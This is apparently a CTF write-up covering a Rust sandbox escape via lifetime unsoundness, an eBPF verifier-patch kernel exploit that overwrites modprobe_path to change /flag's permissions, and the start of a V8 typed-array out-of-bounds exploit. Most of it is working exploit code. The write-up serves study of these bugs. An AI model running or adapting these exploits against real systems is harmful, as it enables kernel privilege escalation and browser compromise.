## Rev

### Cpp

- `gcc -E -dD <target>` 可以看到 expand macro definition



## Pwn

chall.py:

```python
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


import os
import shutil
import subprocess
import sys
import json

def socket_print(string):
    print("=====", string, flush=True)


def get_user_input():
    socket_print("Enter partial source for edge compute app (EOF to finish):")
    user_input = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line == "EOF":
            break
        user_input.append(line)
    socket_print("Input accepted!")
    return user_input


def write_to_rs(contents):
    socket_print("Writing source to disk...")
    rs_prelude = """#![no_std]
    use proc_sandbox::sandbox;

    #[sandbox]
    pub mod user {
        // BEGIN PLAYER REPLACEABLE SECTION
    """.splitlines()
    print('\n'.join(rs_prelude))
    with open('/home/user/sources/user-0/src/lib.rs', 'w') as fd:
        fd.write('\n'.join(rs_prelude))
        fd.write('\n'.join(contents))
        fd.write("\n}\n")

def check_user_input():
    socket_print("Validating user input before compiling...")
    result = subprocess.run("/home/u1f383/.rustup/toolchains/1.47.0-x86_64-unknown-linux-gnu/bin/rustc user-0/src/lib.rs -Zast-json=yes", cwd="/home/user/sources", shell=True, timeout=150, capture_output=True)
    try:
        ast = json.loads(result.stdout)
        if len(ast["module"]["items"]) != 5:
            socket_print("Module escaping detected, aborting.")
            sys.exit(1)

    except json.JSONDecodeError:
        socket_print("Something went wrong during validation -- is your input malformed?")
        sys.exit(1)

def build_challenge():
    socket_print("Building edge compute app...")
    if os.path.exists("/tmp/chal-build"):
        shutil.rmtree("/tmp/chal-build")
    shutil.copytree("/home/user/build-cache", "/tmp/chal-build")
    # `rustc --version` == "rustc 1.47.0"
    result = subprocess.run("PATH=/usr/bin:$PATH LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu/ CARGO_TARGET_DIR=/tmp/chal-build /home/u1f383/.cargo/bin/cargo build --frozen --offline", cwd="/home/user/sources", shell=True, timeout=150) # output directory in /tmp/chal-build/debug/
    if result.returncode:
        socket_print("non-zero return code on compilation: " + str(result.returncode))
        sys.exit(1)
    socket_print("Build complete!")


def run_challenge():
    socket_print("Testing edge compute app...")
    result = subprocess.run("/tmp/chal-build/debug/server", shell=True, timeout=10)
    socket_print("Test complete!")


def main():
    user_input = get_user_input() # 讀 code
    write_to_rs(user_input) # 寫 .rs
    build_challenge() # build rust package

    # Check user input after building since the compilation in check_user_input() will
    # generate errors after generating the ast since the compilation command is
    # incomplete. Let the proper build run first so users can be presented with any
    # compilation issues, then validate it before we actually run.
    check_user_input() # rustc user-0/src/lib.rs -Zast-json=yes

    run_challenge()


if __name__ == "__main__":
    main()
```

- `--frozen`: Require Cargo.lock and cache are up to date
- `--offline`: Run without accessing the network
- `--build`: Compile the current package

`-Zast-json=yes` 的格式像是:

```json
In [9]: ast['module']['items'][0]                                             
Out[9]: 
{'attrs': [{'kind': {'variant': 'Normal',
    'fields': [{'path': {'span': {'lo': 0, 'hi': 0},
       'segments': [{'ident': {'name': 'prelude_import',
          'span': {'lo': 0, 'hi': 0}},
         'id': 4,
         'args': None}],
       'tokens': None},
      'args': 'Empty',
      'tokens': None}]},
   'id': None,
   'style': 'Outer',
   'span': {'lo': 0, 'hi': 0}}],
 'id': 5,
 'span': {'lo': 0, 'hi': 0},
 'vis': {'kind': 'Inherited', 'span': {'lo': 0, 'hi': 0}, 'tokens': None},
 'ident': {'name': '', 'span': {'lo': 0, 'hi': 0}},
 'kind': {'variant': 'Use',
  'fields': [{'prefix': {'span': {'lo': 0, 'hi': 0},
     'segments': [{'ident': {'name': '{{root}}', 'span': {'lo': 0, 'hi': 0}},
       'id': 6,
       'args': None},
      {'ident': {'name': 'core', 'span': {'lo': 0, 'hi': 0}},
       'id': 7,
       'args': None},
      {'ident': {'name': 'prelude', 'span': {'lo': 0, 'hi': 0}},
       'id': 8,
       'args': None},
      {'ident': {'name': 'v1', 'span': {'lo': 0, 'hi': 0}},
       'id': 9,
       'args': None}],
     'tokens': None},
    'kind': 'Glob',
    'span': {'lo': 0, 'hi': 0}}]},
 'tokens': None}
```

Rust preinclude sample: 

```rust
#![no_std]
    use proc_sandbox::sandbox;

    #[sandbox]
    pub mod user {
        // BEGIN PLAYER REPLACEABLE SECTION
        // ------------------------------
       	USER CODE
        // ------------------------------
	}
```

而 CODE (input) 有一些限制:

```python
        if len(ast["module"]["items"]) != 5:
            socket_print("Module escaping detected, aborting.")
            sys.exit(1)
```

先看程式進入點 `server`，建立了兩個 `Service`:

```rust
use prelude::Service;
fn main() {
    let mut services: Vec<Box<dyn Service>> = vec![
        user_0::user::State::new(),
        user_1::user::State::new(),
    ];
    for service in &mut services {
        service.handle("test query");
    }
}
```

- `let`: introduce a new set of variables into the current scope, as given by a pattern
- `mut`: 有兩種功能
  - **mutable variables**, which can be used anywhere you can bind a value to a variable name
  - **must be unique**: no other variables can have a mutable reference, nor a shared reference
- `vec`: vec! macro is provided to make initialization more convenient

user1:

```rust
// /user-1/src/lib.rs

#![no_std]
use proc_sandbox::sandbox;

#[sandbox]
pub mod user {
    static FLAG: &'static str = "CTF{fake flag}";
    use prelude::{mem::ManuallyDrop, Service, Box, String};
    pub struct State(ManuallyDrop<String>); // new a State struct
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new( State(ManuallyDrop::new(String::from(FLAG))) )
        }
    }
    // implement a "Service" trait for struct "State"
    impl Service for State {
       fn handle(&mut self, _: &str) {}
    }
}
```

- `no_std`: 加上`#![no_std]`屬性的Rust函式庫內就無法去使用`std`這個 crate 下的所有功能
- `mod`: Use `mod` to create new modules to encapsulate code, including other modules
- `struct State(ManuallyDrop<String>)`: 建立一個 `State` struct，需要傳入 `ManuallyDrop<String>`
  - `ManuallyDrop`: control the drop order, but this requires unsafe code and is hard to do correctly in the presence of unwinding，所以就不會自動 drop
- `impl`: Implement some functionality for a type
- `Box`: A pointer type for heap allocation
- `dyn`: used to highlight that calls to methods on the **associated Trait are dynamically dispatched**
- `prelude`: a collection of names that are automatically brought into scope of every module in a crate
- `pub`: Make an item visible to others
- `impl Trait for Struct`: implements the trait `Trait` for the struct `Struct`. This results in the methods of the trait being available for `Struct`
- `handle`: 
  - A handle trait for asynchronous context pipeline
  - Maintain context in multiple handlers
- `&mut self`: means a mutable reference to `self`. This reference type allows you to modify `self` without taking ownership of it
- `&str`: one of the two main string types (the other is `String`), and its contents are borrowed
  - `_: &str`: 傳入的 `_` 的 type 為 `&str`，不過 `_` 為 ignore parameter，基本上 user1 什麼事情都不做

看起來 flag 在 user1 這邊，但是 `handle(&mut self, _: &str) {}` 卻不做任何行為。



prelude:

```rust
pub use std::io::Read;
pub use std::io::Result as IoResult;
pub use std::vec::Vec;
pub use std::println as log;
pub use std::string::String;
pub use std::str;
pub use std::mem;
pub use std::boxed::Box;

pub trait Service {
    fn handle(&mut self, query: &str);
}
```



sandbox:

```rust
/*
    Copyright 2021 Google LLC

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        https://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
use proc_macro::TokenStream;
use quote::ToTokens;
use syn::visit::Visit;
use syn::{parse_macro_input, ExprUnsafe, ForeignItem, Ident, Item, ItemExternCrate};

struct Sandbox;
const BLOCKLIST: &[&str] = &[
    "env",
    "file",
    "include",
    "include_bytes",
    "include_str",
    "option_env",
    "std",
];

impl<'ast> Visit<'ast> for Sandbox {
    fn visit_expr_unsafe(&mut self, _: &'ast ExprUnsafe) {
        panic!("Unsafe is not allowed");
    }
    fn visit_foreign_item(&mut self, _: &'ast ForeignItem) {
        panic!("Linking to external symbols is not allowed");
    }
    fn visit_item_extern_crate(&mut self, _: &'ast ItemExternCrate) {
        panic!("Extern declarations are not allowed");
    }
    fn visit_ident(&mut self, ident: &'ast Ident) {
        // We could loosen this to only direct macro usage or use-rebinding
        if BLOCKLIST.iter().any(|blocked_ident| ident == blocked_ident) {
            panic!("Please don't try to access the compilation environment");
        }
    }
}

fn sandbox_item(item: Item) -> Item {
    Sandbox.visit_item(&item);
    item
}

#[proc_macro_attribute]
pub fn sandbox(_attr: TokenStream, item_tokens: TokenStream) -> TokenStream {
    let item = parse_macro_input!(item_tokens as Item);
    TokenStream::from(sandbox_item(item).into_token_stream())
}
```

- `Visit`: Each method of the Visit trait is a hook that can be overridden to customize the behavior when visiting the corresponding type of node
  - `syn::ExprUnsafe`: `unsafe { ... }`
  - `syn::ForeignItem`: An item within an extern block
  - `syn::ItemExternCrate`: An extern crate item: extern crate serde
  - `syn::Ident`: A word of Rust code, which may be a keyword or legal variable name
- `{... item}`: function finally return `item`
- `'ast`: a named lifetime and use the same lifetime for reference, having the same lifetime as a given input reference
  - named lifetimes are also used to indicate **the origin of a returned borrowed variable** to the rust compiler
- `#[proc_macro_attribute]`:
  - use `proc_macro` library to defined macro definitions such as function-like macros `#[proc_macro]`
  - `(TokenStream, TokenStream) -> TokenStream`
- `parse_macro_input!`: Parse the input TokenStream of a macro, triggering a compile error if the tokens fail to parse
  - Macros use `!` to distinguish them from normal method calls

目標應該是必須要使用 user0 以及避免 sandbox 的 blacklist，存取到 user1 的 `FLAG`。

```
// file
/tmp/chal-build/debug/server: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d404d145639484f7b2bc8ddabb40d2fa0a7d3cd8, for GNU/Linux 3.2.0, with debug_info, not stripped

// checksec
[*] '/tmp/chal-build/debug/server'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`CTF{fake flag}` 會在 heap 上，並且 size 為 0x20，雖然 remote 應該會有不同，不過先假定 flag 在附近。

[這篇文章](https://hydrogen5.github.io/2020/03/09/Rust%E4%B9%8B%E6%AE%87%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E7%9A%84%E8%BE%B9%E7%95%8C/#%E9%80%83%E7%A6%BB%E4%BC%8A%E7%94%B8)簡單介紹了過去一個 rust 的洞，可以做到任意讀寫，看了一下 issue 發現現在還沒修好，後續找了一些關於 nightly 1.47.0~1.48.0 的 issue，也沒發現沒什麼特別的，因此嘗試使用這個洞來 exploit。

其中有做了一些修正，因為 `Vec` 或是 `Box` memory allocation 的大小有些變化，不過都是要讓 `let mut x: Vec<i64> = Vec::new();` 可以寫到過去 `let mut b = Vec::new();` 所產生的 memory region，並且將原本的 data pointer inject 成指定位置，之後再用 `pa` 去讀指定做 leak 即可。user-1 flag 的位置可以用 `gdb search -s "CTF{fake flag}"` 找到。



簡單介紹一下 [rust 的洞](https://github.com/rust-lang/rust/issues/25860):

```rust
static UNIT: &'static &'static () = &&();

fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T {
    v
}

fn bad<'b, T>(x: &'b T) -> &'static T {
    let f: fn(_, &'b T) -> &'static T = foo;
    f(UNIT, x)
}
```

- `UNIT` 是一個 type 為 `&'static &'static ()` 的 global variable，`&'static &'static ()` 為指向 tatic reference of static reference 的 function
- `foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T` 為 template function，有三個參數 `'a`, `'b`, `T`
  - 第一個 parameter `_` 會隱式 (Implicit) 要求 `'b: 'a`，因為 inner reference (`'b`) 的生命週期會比外層 (`'a`) 還常
  - 第二個參數會直接回傳 v，並且 `'b T` -> `'a T`
- `bad<'b, T>(x: &'b T) -> &'static T` 接收任意的 reference `&'b T`，回傳 static reference `&'static T`，但是 assign `foo` to `f` 時會發生問題。當 `fn(_, &'b T)` 沒有第一個參數時，`foo` 選擇 `<'static, 'b , T>` 來做單態，但是這不符合 `'b: 'a`，因此呼叫 `f(UNIT, x)` 後，reference 可以一直保留 (因為是 `static`)



exploit:

```python
#!/usr/bin/python3

from pwn import *

flag = b""

for off in range(33, -9, -5):
    r = remote('memsafety.2021.ctfcompetition.com', 1337)
    payload = """
    use prelude::{mem::ManuallyDrop, Service, Box, String, Vec, log};
            static FLAG: &'static str = "TEST";
            pub struct State(ManuallyDrop<String>);
            impl State {
                pub fn new() -> Box<dyn Service> {
                    Box::new( State(ManuallyDrop::new(String::from(FLAG))) )
                }
            }

            static UNIT: &'static &'static () = &&();
            fn foo<'a, 'b, T>(_: &'a &'b (), v: &'b T) -> &'a T {
                v
            }

            fn bad<'b, T>(x: &'b T) -> &'static T {
                let f: fn(_, &'b T) -> &'static T = foo;
                f(UNIT, x)
            }
            
            impl Service for State {
                fn handle(&mut self, a: &str) {
                    let mut pa;
                    {
                        // 0x60
                        let mut b = Vec::new();
                        for i in 0..0x60 {
                            b.push(String::from("aaaaa"));
                        }
                        pa = bad(&b);
                        log!("{:p}", pa); // 0x00005555555adb00 -> (raw_ptr, len, capability)
                    }
                    log!("{:p}", pa); // 0x00005555555adb00 -> 0
                    {
                        // 0x20
                        let mut x: Vec<i64> = Vec::new();
                        for i in 0..0xb0 {
                            x.push(0x10);
                        }
                        let m = x.as_ptr() as i64;
                        x.push(m - 0x000f00 - """ + str(off) + """);
                        log!("{:x}", m);
                        log!("{:p}", &x);
                        log!("{:?}", pa[2]);
                    }
                }
            }
    """ + "\nEOF\n"
    r.send(payload)
    r.recvuntil('===== Testing edge compute app...')
    flag += r.recvuntil('\n===== Test complete!', drop=True).split(b'\n')[-1].replace(b'"', b'')
    r.close()

print(flag)
```



- [setup environ + document](https://doc.rust-lang.org/cargo/getting-started/installation.html)
  - **cargo**: the package manager and create host for rust
    - install: `curl https://sh.rustup.rs -sSf | sh`
    - `Cargo.toml`: 一個 manifest (清單)，可以在內指定不同 metadata 的 file (自己寫)
    - `Cargo.lock`: 包含有相關 dependency 的資訊，由 Cargo 本身維護/更新
  - nightly
    - 特定版本 (rust 1.47.0 + nightly) install: `rustup toolchain add nightly-2020-07-23 --profile minimal`
    - `rustup toolchain list -v` 可以看 toolchain 的位置
    - `rustup toolchain remove <toolchains>`: 解除安裝
  - `rustc`: rust compiler
- 使用 pwngdb debug rust 時 u16 會找不到，可以用 `set language c` -> `set language rust` 來解決
- [github search](https://docs.github.com/en/github/searching-for-information-on-github/searching-on-github/searching-issues-and-pull-requests) 增加搜尋速度
  - `unsound` / `bug` tag 與安全/功能相關



### ebpf

kernel version

```
Linux (none) 5.12.2 #1 SMP Tue Jun 22 23:15:48 UTC 2021 x86_64 GNU/Linux
```

patch1:

```diff
--- linux-5.12.2/include/linux/bpf_verifier.h	2021-05-07 03:53:26.000000000 -0700
+++ linux-5.12.2-modified/include/linux/bpf_verifier.h	2021-06-15 20:06:53.019787853 -0700
@@ -156,6 +156,7 @@
 	enum bpf_reg_liveness live;
 	/* if (!precise && SCALAR_VALUE) min/max/tnum don't affect safety */
 	bool precise;
+   bool auth_map;
 };
 
 enum bpf_stack_slot_type {
```

patch2:

```diff
--- linux-5.12.2/kernel/bpf/verifier.c	2021-05-07 03:53:26.000000000 -0700
+++ linux-5.12.2-modified/kernel/bpf/verifier.c	2021-06-15 20:06:54.495796355 -0700
@@ -2923,6 +2924,7 @@
 				   int off, int size, u32 mem_size,
 				   bool zero_size_allowed)
 {
+  
 	struct bpf_verifier_state *vstate = env->cur_state;
 	struct bpf_func_state *state = vstate->frame[vstate->curframe];
 	struct bpf_reg_state *reg = &state->regs[regno];
@@ -6326,13 +6330,19 @@
 				memset(&dst_reg->raw, 0, sizeof(dst_reg->raw));
 		}
 		break;
-	case BPF_AND:
-	case BPF_OR:
 	case BPF_XOR:
-		/* bitwise ops on pointers are troublesome, prohibit. */
-		verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
-			dst, bpf_alu_string[opcode >> 4]);
-		return -EACCES;
+                // As long as we downgrade the result to scalar it is safe.
+                if (dst_reg->type == PTR_TO_MAP_VALUE) {
+                        dst_reg->type = SCALAR_VALUE;
+                        dst_reg->auth_map = true;
+                        break;
+                }
+   case BPF_AND:
+	case BPF_OR:
+	  	/* bitwise ops on pointers are troublesome, prohibit. */
+	  	verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
+	  		dst, bpf_alu_string[opcode >> 4]);
+	  	return -EACCES;
 	default:
 		/* other operators (e.g. MUL,LSH) produce non-pointer results */
 		verbose(env, "R%d pointer arithmetic with %s operator prohibited\n",
@@ -7037,6 +7047,13 @@
 		scalar_min_max_or(dst_reg, &src_reg);
 		break;
 	case BPF_XOR:
+                /* Restore the pointer type.*/
+                if (dst_reg->auth_map) {
+                         dst_reg->auth_map = false;
+                         dst_reg->type = PTR_TO_MAP_VALUE;
+                         break;
+                }
+
 		dst_reg->var_off = tnum_xor(dst_reg->var_off, src_reg.var_off);
 		scalar32_min_max_xor(dst_reg, &src_reg);
 		scalar_min_max_xor(dst_reg, &src_reg);
```

看似複雜，不過簡化後可以看成:

```diff
static int adjust_ptr_min_max_vals(...)
{
...
case BPF_XOR:
-		/* bitwise ops on pointers are troublesome, prohibit. */
-		verbose(env, "R%d bitwise operator %s on pointer prohibited\n",
-			dst, bpf_alu_string[opcode >> 4]);
-		return -EACCES;
+                if (dst_reg->type == PTR_TO_MAP_VALUE) {
+                        dst_reg->type = SCALAR_VALUE;
+                        dst_reg->auth_map = true;
+                        break;
+                }

static int adjust_scalar_min_max_vals(...)
{
	case BPF_XOR:
+                /* Restore the pointer type.*/
+                if (dst_reg->auth_map) {
+                         dst_reg->auth_map = false;
+                         dst_reg->type = PTR_TO_MAP_VALUE;
+                         break;
+                }
+
...
```



Exploit:

```c
#include <linux/bpf.h>
#include <sys/socket.h>
#include <stdio.h>
#include <assert.h>
#include "bpf_insn.h"

struct bpf_insn insns[] =
{
    BPF_GET_MAP(3, 0),

    // ------------- 0. leak kern -------------
    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0), // r2 = r0[0]
    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0, 11),

    BPF_MOV64_REG(BPF_REG_1, BPF_REG_0), // r1 = r0
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_0), // r2 = r0
    
    BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0), // r0 to scalar
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, -0x110), // r0 -= 0x110
    
    BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_1), // r0 ^= r1
    BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0), // r1 ^= r0, r1 to scalar
    BPF_ALU64_IMM(BPF_XOR, BPF_REG_1, 0), // r1 to ptr

    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_1, 0), // r3 = r1[0]
    BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0), // r2[0] = r3
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // ------------- 1. overwrite modprobe_path -------------
    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0), // r2 = r0[0]
    BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 1, 12),

    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0x8), // r2 = r0[1]
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0x10), // r3 = r0[2]

    /* for r0 ^= r2 */
    BPF_MOV64_IMM(BPF_REG_4, 0x1),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 48),
    BPF_JMP_REG(BPF_JLE, BPF_REG_2, BPF_REG_4, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_ALU64_REG(BPF_XOR, BPF_REG_0, BPF_REG_2), // r0 ^= r2

    BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0),
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0), // *(r0 + 0) = r3
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // ------------- 2. leak heap -------------
    BPF_MOV64_IMM(BPF_REG_1, 0), // r1 = 0
    BPF_ALU64_REG(BPF_XOR, BPF_REG_1, BPF_REG_0), // r1 ^= r0
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0), // *(r0 + 0) = r1
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
};

int map_fd, prog_fd;
int socks[2];
const int key = 0;
uint64_t kern, heap;
char *mapbuf;
uint64_t *mapbuf_64;

void setup_modprobe_path()
{
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/pwn");
    system("chmod +x /tmp/pwn");
}

void init_proc()
{
    setup_modprobe_path();
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1);
    prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns,
                            sizeof(insns) / sizeof(insns[0]), "GPL");
    printf("map_fd: %d\nprog_fd: %d\n", map_fd, prog_fd);
    socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
    assert(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF,
                        &prog_fd, sizeof(prog_fd)) == 0);
    mapbuf = (char *) malloc(0x100);
    mapbuf_64 = (uint64_t *) mapbuf;
    memset(mapbuf, 0, 0x100);
}

void trigger_hook()
{
    char buf[64] = {0};
    puts("trigger hook ...");
    syscall(__NR_write, socks[1], buf, sizeof(buf));
}

void leak_kern()
{
    mapbuf_64[0] = 0;
    bpf_update_elem(map_fd, &key, mapbuf, 0);
    trigger_hook();
    bpf_lookup_elem(map_fd, &key, mapbuf);
    kern = mapbuf_64[0];
    _log("kern", kern);
}

void leak_heap()
{
    mapbuf_64[0] = 2;
    bpf_update_elem(map_fd, &key, mapbuf, 0);
    trigger_hook();
    bpf_lookup_elem(map_fd, &key, mapbuf);
    heap = mapbuf_64[0];
    _log("heap (map_addr)", heap);
}

void overwrite_modprobe_path()
{
    uint64_t modprobe_path = kern + 0x6368c0;
    uint64_t xor_val = modprobe_path ^ heap;

    mapbuf_64[0] = 1;
    mapbuf_64[1] = xor_val;
    mapbuf_64[2] = 0x782f706d742f; // /tmp/x
    _log("modprobe_path", modprobe_path);
    _log("xor_val", mapbuf_64[1]);

    bpf_update_elem(map_fd, &key, mapbuf, 0);
    trigger_hook();
    bpf_lookup_elem(map_fd, &key, mapbuf);
    _log("overwrite modprobe_path done", 0);
}

void exploit()
{
    leak_kern();
    leak_heap();
    overwrite_modprobe_path();
}

int main()
{
    init_proc();
    exploit();
    free(mapbuf);

    return 0;
}
```

bpf_insn.h from [here](https://github.com/torvalds/linux/blob/master/samples/bpf/bpf_insn.h), and I append some helper functions / macros to it:

```c
#define SO_ATTACH_BPF 50
#define LOG_BUF_SIZE 65536

char bpf_log_buf[LOG_BUF_SIZE];
struct bpf_insn;

#define BPF_CALL_FUNC(FUNC) \
	((struct bpf_insn) {                                    \
		.code = BPF_JMP | BPF_CALL | BPF_K,				\
		.dst_reg = 0,	\
		.src_reg = 0,	\
		.off = 0, \
		.imm = FUNC })

/**
 * r1 = fd
 * r2 = idx
 * [r10-4] = idx
 * r2 = r10
 * r2 -= 4 // idx
 * map_lookup_elem(r1, r2)
 */
#define BPF_GET_MAP(fd, idx) \
        BPF_LD_MAP_FD(BPF_REG_1, fd), \
        BPF_MOV64_IMM(BPF_REG_2, idx), \
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_2, -4), \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), \
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), \
		BPF_EXIT_INSN()

void _log(const char *s, unsigned long val)
{
	char buf[128];
	if (val) {
		sprintf(buf, "[*] %s : 0x%016lx", s, val);
	} else {
		sprintf(buf, "[*] %s", s);
	}
	puts(buf);
}

void show(uint64_t *ptr, int num)
{
    puts("----------- show -----------");
    for (int i = 0 ; i < num; i++)
        printf("%d:  0x%016lx \n", i, ptr[i]);
    puts("----------- end -----------\n");
}

int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* REF: https://man7.org/linux/man-pages/man2/bpf.2.html */

/**
 * The BPF_MAP_CREATE command creates a new map, returning a
 * new file descriptor that refers to the map
 */
static inline int
bpf_create_map(enum bpf_map_type map_type,
                unsigned int key_size,
                unsigned int value_size,
                unsigned int max_entries)
{
    union bpf_attr attr = {
        .map_type    = map_type,
        .key_size    = key_size,
        .value_size  = value_size,
        .max_entries = max_entries
    };
	
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

/**
 * The BPF_PROG_LOAD command is used to load an eBPF program into
 * the kernel.  The return value for this command is a new file
 * descriptor associated with this eBPF program
 */
static inline int
bpf_prog_load(enum bpf_prog_type type,
                const struct bpf_insn *insns, int insn_cnt,
                const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns     = (uint64_t) insns,
        .insn_cnt  = insn_cnt,
        .license   = (uint64_t) license,
        .log_buf   = (uint64_t) bpf_log_buf,
        .log_size  = LOG_BUF_SIZE,
        .log_level = 1,
        .kern_version = 0,
    };
    bpf_log_buf[0] = 0;
    return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

/**
 * The BPF_MAP_UPDATE_ELEM command creates or updates an
 * element with a given key/value in the map referred to by
 * the file descriptor fd
 */
static inline int
bpf_update_elem(int fd, const void *key, const void *value,
                uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (uint64_t) key,
        .value  = (uint64_t) value,
        .flags  = flags,
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

/**
 * The BPF_MAP_LOOKUP_ELEM command looks up an element with a
 * given key in the map referred to by the file descriptor
 * fd.
 */
static inline int
bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (uint64_t) key,
        .value  = (uint64_t) value,
    };

    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
```



### Full chain



這題涵蓋了三個不同服務的攻擊：browser exploit (V8) + sandbox escape (mojo) + kernel exploit，並且 patch 皆是一眼能夠看出漏洞的程度，是一個想接觸 browser exploit 與 kernel exploit 很好的進入點。

P.S. 我對 browser / kernel 相關的 exploit 還不是很熟，因此該題皆參考他人的 writeup + 測試來完成。



**Part.1 V8**

對 V8 的 patch 如下：

```diff
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..ac5ebe9913 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -198,7 +198,7 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(
   if (targetOffsetOverflowed) goto IfOffsetOutOfBounds;

   // 9. Let targetLength be target.[[ArrayLength]].
-  const targetLength = target.length;
+  // const targetLength = target.length;

   // 19. Let srcLength be typedArray.[[ArrayLength]].
   const srcLength: uintptr = typedArray.length;
@@ -207,8 +207,8 @@ TypedArrayPrototypeSetTypedArray(implicit context: Context, receiver: JSAny)(

   // 21. If srcLength + targetOffset > targetLength, throw a RangeError
   //   exception.
-  CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
-      otherwise IfOffsetOutOfBounds;
+  // CheckIntegerIndexAdditionOverflow(srcLength, targetOffset, targetLength)
+  //     otherwise IfOffsetOutOfBounds;

   // 12. Let targetName be the String value of target.[[TypedArrayName]].
   // 13. Let targetType be the Element Type value in Table 62 for
```

在使用 TypedArray 的 built-in function `.set()` 時，並不會對 index 做 bound 檢查，因此能做到將資料蓋寫到後面的資料，構造 primitive `addrof`、`fakeobj` 的方式是透過 oob 蓋掉某個 JSObject 的 length，藉此讀取與蓋寫後續的 JSObject ，而 `aar64` 與 `aaw64` 是透過蓋寫 TypedArray 的 data_ptr。最後透過建立 div html element，並讀取其 member 取得 HTMLDivElement 的位址，透過減去 offset 得到 code base，而後加上 `mojo_js_enabled` 的 offset，蓋寫成 1 來開啟 mojoJS，才能在第二階段攻擊 Mojo，exploit 如下：

```js
let x = new Uint32Array(1);
let y = new Uint32Array(1);
let oob = [1.1];
let evil = [{}];
let victim_obj = new BigUint64Array(1);
x.set([0x2222], 0);
// you dont need to overwrite length in element
// y.set(x, 20);
y.set(x, 26);

let buf = new ArrayBuffer(8);
let u32 = new Uint32Array(buf);
let u64 = new BigUint64Array(buf);
let f64 = new Float64Array(buf);

function addrof(obj) {
    evil[0] = obj;
    f64[0] = oob[4];
    return BigInt(u32[0] - 1);
}

function fakeobj(addr) {
    oob[4] = addr;
    return evil[0];
}

// leak high heap address from typed array
// external_pointer (obj + 0x28)
f64[0] = oob[25];
let high_heap = BigInt(u32[1]) << 32n;
console.log("[+] heap high address: ", high_heap.toString(16));

// the typed array data_ptr is
// base_pointer(obj+0x30, 4 bytes) + external_pointer(obj+0x28, 8 bytes)
